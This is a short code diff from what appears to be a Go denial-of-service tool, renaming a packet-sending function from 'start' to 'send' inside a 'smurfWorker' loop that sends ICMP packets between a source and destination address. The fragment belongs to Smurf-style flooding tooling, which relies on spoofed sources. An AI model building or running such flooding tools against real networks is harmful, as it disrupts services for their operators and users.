@@ -56,7 +56,7 @@ func createPayload() gopacket.Payload {
 	return payload
 }
 
-func start(src net.IP, dest net.IP) {
+func send(src net.IP, dest net.IP) {
 	var (
 		header layers.IPv4
 		packet layers.ICMPv4
@@ -111,7 +111,7 @@ func exit(message string) {
 
 func smurfWorker(src net.IP, dst net.IP, jobs uint16, wg *sync.WaitGroup) {
 	for i := uint16(0); i < jobs; i++ {
-		start(src, dst)
+		send(src, dst)
 	}
 	wg.Done()
 }
